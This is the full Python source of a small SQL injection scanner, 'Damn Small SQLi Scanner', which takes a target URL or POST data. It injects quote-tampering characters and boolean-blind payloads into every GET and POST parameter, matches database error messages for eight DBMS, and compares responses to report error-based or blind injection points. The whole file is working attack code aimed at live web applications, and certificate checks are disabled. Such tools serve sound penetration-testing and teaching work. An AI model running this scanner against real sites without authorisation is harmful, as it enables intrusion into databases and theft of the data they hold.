#!/usr/bin/python3
import base64, difflib, http.client, itertools, optparse, random, re, ssl, urllib, urllib.parse, urllib.request  # Python 3 required

NAME, VERSION, AUTHOR, LICENSE = "Damn Small SQLi Scanner (DSSS) < 100 LoC (Lines of Code)", "0.4b", "Miroslav Stampar (@stamparm)", "Public domain (FREE)"

PREFIXES, SUFFIXES = (" ", ") ", "' ", "') "), ("", "-- -", "#", "%%16")            # prefix/suffix values used for building testing blind payloads
TAMPER_SQL_CHAR_POOL = ('(', ')', '\'', '"')                                        # characters used for SQL tampering/poisoning of parameter values
BOOLEAN_TESTS = ("AND %d=%d", "OR NOT (%d>%d)")                                     # boolean tests used for building testing blind payloads
COOKIE, UA, REFERER, AUTH = "Cookie", "User-Agent", "Referer", "Authorization"      # optional HTTP header names
SAFE = "!#$%&'()*+,-./:;=?@[]_~"                                                    # characters that must not be percent-encoded when sanitizing a target URL
GET, POST = "GET", "POST"                                                           # enumerator-like values used for marking current phase
TEXT, HTTPCODE, TITLE, HTML = range(4)                                             # enumerator-like values used for marking content type
FUZZY_THRESHOLD = 0.95                                                              # ratio value in range (0,1) used for distinguishing True from False responses
TIMEOUT = 30                                                                        # connection timeout in seconds
RANDINT = random.randint(1, 255)                                                    # random integer value used across all tests
BLOCKED_IP_REGEX = r"(?i)(\A|\b)IP\b.*\b(banned|blocked|bl(a|o)ck\s?list|firewall)" # regular expression used for recognition of generic firewall blocking messages

DBMS_ERRORS = {                                                                     # regular expressions used for DBMS recognition based on error message response
    "MySQL": (r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"valid MySQL result", r"MySqlClient\."),
    "PostgreSQL": (r"PostgreSQL.*ERROR", r"Warning.*\Wpg_.*", r"valid PostgreSQL result", r"Npgsql\.", r"\bpsycopg2?\.[\w.]*Error\b"),
    "Microsoft SQL Server": (r"Driver.* SQL[\-\_\ ]*Server", r"OLE DB.* SQL Server", r"(\W|\A)SQL Server.*Driver", r"Warning.*mssql_.*", r"(\W|\A)SQL Server.*[0-9a-fA-F]{8}", r"(?s)Exception.*\WSystem\.Data\.SqlClient\.", r"(?s)Exception.*\WRoadhouse\.Cms\."),
    "Microsoft Access": (r"Microsoft Access Driver", r"JET Database Engine", r"Access Database Engine"),
    "Oracle": (r"\bORA-[0-9][0-9][0-9][0-9]", r"Oracle error", r"Oracle.*Driver", r"Warning.*\Woci_.*", r"Warning.*\Wora_.*"),
    "IBM DB2": (r"CLI Driver.*DB2", r"DB2 SQL error", r"\bdb2_\w+\("),
    "SQLite": (r"SQLite/JDBCDriver", r"SQLite.Exception", r"System.Data.SQLite.SQLiteException", r"Warning.*sqlite_.*", r"Warning.*SQLite3::", r"\[SQLITE_ERROR\]", r"\bsqlite3\.\w*Error\b"),
    "Sybase": (r"(?i)Warning.*sybase.*", r"Sybase message", r"Sybase.*Server message.*"),
}

def _retrieve_content(url, data=None):
    retval, parsed = {HTTPCODE: http.client.OK}, urllib.parse.urlsplit(url)                     # netloc is kept as it is (IDN hosts are encoded by http.client itself)
    headers = dict(globals().get("_headers", {}), **({AUTH: "Basic %s" % base64.b64encode(urllib.parse.unquote(parsed.netloc.rpartition('@')[0]).encode("utf8")).decode()} if '@' in parsed.netloc else {}))
    try:
        req = urllib.request.Request(urllib.parse.urlunsplit(parsed._replace(netloc=parsed.netloc.rpartition('@')[2], path=urllib.parse.quote(parsed.path, safe=SAFE), query=urllib.parse.quote(parsed.query, safe=SAFE))), data.encode("utf8", "ignore") if data else None, headers)
        retval[HTML] = urllib.request.urlopen(req, timeout=TIMEOUT).read()
    except Exception as ex:
        retval[HTTPCODE] = getattr(ex, "code", None)
        retval[HTML] = ex.read() if hasattr(ex, "read") else b""
    retval[HTML] = (retval[HTML].decode("utf8", "ignore") if hasattr(retval[HTML], "decode") else "") or ""
    if re.search(BLOCKED_IP_REGEX, retval[HTML]): retval[HTTPCODE], retval[HTML] = None, ""                     # blocked content must not be compared against anything
    retval[HTML] = re.sub(r"(?i)\b(AND|OR)\b[^<>]{0,32}\b%d\b[^<>]{0,32}" % RANDINT, "__REFLECTED__", retval[HTML])
    match = re.search(r"<title[^>]*>(?P<result>[^<]+)</title>", retval[HTML], re.I)
    retval[TITLE] = match.group("result") if match and "result" in match.groupdict() else None
    retval[TEXT] = re.sub(r"(?si)<script.+?</script>|<!--.+?-->|<style.+?</style>|<[^>]+>|\s+", " ", retval[HTML])
    return retval

def scan_page(url, data=None):
    retval, usable = False, False
    url, data = re.sub(r"=(&|\Z)", r"=1\g<1>", url.split('#')[0]) if url else url, re.sub(r"=(&|\Z)", r"=1\g<1>", data) if data else data      # fragments are never sent to the server
    try:
        for phase in (GET, POST):
            original, current = None, (url or "") if phase is GET else (data or "")
            for match in re.finditer(r"((\A|[?&])(?P<parameter>[^\W_][\w.\-\[\]]*)=)(?P<value>[^&]+)", current):
                vulnerable, usable = False, True
                print("* scanning %s parameter '%s'" % (phase, match.group("parameter")))
                tampered = "%s%s%s" % (current[:match.end()], urllib.parse.quote("".join(random.sample(TAMPER_SQL_CHAR_POOL, len(TAMPER_SQL_CHAR_POOL)))), current[match.end():])
                content = _retrieve_content(tampered, data) if phase is GET else _retrieve_content(url, tampered)                        # this one goes first, so that the original is not the odd (e.g. session establishing) request out
                original = original or (_retrieve_content(current, data) if phase is GET else _retrieve_content(url, current))
                if not original[HTTPCODE]: print(" (x) unable to retrieve the original content"); break
                for (dbms, regex) in ((dbms, regex) for dbms in DBMS_ERRORS for regex in DBMS_ERRORS[dbms]):
                    if not vulnerable and re.search(regex, content[HTML], re.I) and not re.search(regex, original[HTML], re.I):
                        print(" (i) %s parameter '%s' appears to be error SQLi vulnerable (%s)" % (phase, match.group("parameter"), dbms))
                        retval = vulnerable = True
                vulnerable = False
                for prefix, boolean, suffix, inline_comment in itertools.product(PREFIXES, BOOLEAN_TESTS, SUFFIXES, (False, True)):
                    if not vulnerable:
                        template = ("%s%s%s" % (prefix, boolean, suffix)).replace(" " if inline_comment else "/**/", "/**/")
                        payloads = dict((_, "%s%s%s" % (current[:match.end()], urllib.parse.quote(template % (RANDINT if _ else RANDINT + 1, RANDINT), safe='%'), current[match.end():])) for _ in (True, False))
                        contents = dict((_, _retrieve_content(payloads[_], data) if phase is GET else _retrieve_content(url, payloads[_])) for _ in (False, True))
                        if all(_[HTTPCODE] and _[HTTPCODE] < http.client.INTERNAL_SERVER_ERROR for _ in (original, contents[True], contents[False])):
                            if any(original[_] == contents[True][_] != contents[False][_] for _ in (HTTPCODE, TITLE, HTML)):
                                vulnerable = True
                            else:
                                ratios = dict((_, difflib.SequenceMatcher(None, original[TEXT], contents[_][TEXT]).quick_ratio()) for _ in (False, True))
                                vulnerable = ratios[True] > FUZZY_THRESHOLD > ratios[False] and ratios[True] - ratios[False] > FUZZY_THRESHOLD / 10
                        if vulnerable:
                            print(" (i) %s parameter '%s' appears to be blind SQLi vulnerable (e.g.: '%s')" % (phase, match.group("parameter"), payloads[True]))
                            retval = True
        if not usable:
            print(" (x) no usable GET/POST parameters found")
    except KeyboardInterrupt:
        print("\r (x) Ctrl-C pressed")
    return retval

def init_options(proxy=None, cookie=None, ua=None, referer=None):
    globals()["_headers"] = dict(filter(lambda _: _[1], ((COOKIE, cookie), (UA, ua or NAME), (REFERER, referer))))
    urllib.request.install_opener(urllib.request.build_opener(*([urllib.request.ProxyHandler(dict((_, proxy) for _ in ("http", "https")))] if proxy else []), urllib.request.HTTPSHandler(context=ssl._create_unverified_context()), urllib.request.HTTPCookieProcessor()))    # keep session cookies, do not choke on self-signed certificates of the target

if __name__ == "__main__":
    print("%s #v%s\n by: %s\n" % (NAME, VERSION, AUTHOR))
    parser = optparse.OptionParser(version=VERSION)
    for names, dest, info in ((("-u", "--url"), "url", "Target URL (e.g. \"http://www.target.com/page.php?id=1\")"), (("--data",), "data", "POST data (e.g. \"query=test\")"), (("--cookie",), "cookie", "HTTP Cookie header value"), (("--user-agent",), "ua", "HTTP User-Agent header value"), (("--referer",), "referer", "HTTP Referer header value"), (("--proxy",), "proxy", "HTTP proxy address (e.g. \"http://127.0.0.1:8080\")")):
        parser.add_option(*names, dest=dest, help=info)                             # same options as ever, just declared in a loop to make room below 100 LoC
    options, _ = parser.parse_args()
    if options.url:
        init_options(options.proxy, options.cookie, options.ua, options.referer)
        result = scan_page(options.url if "://" in options.url else "http://%s" % options.url, options.data)
        print("\nscan results: %s vulnerabilities found" % ("possible" if result else "no"))
    else:
        parser.print_help()
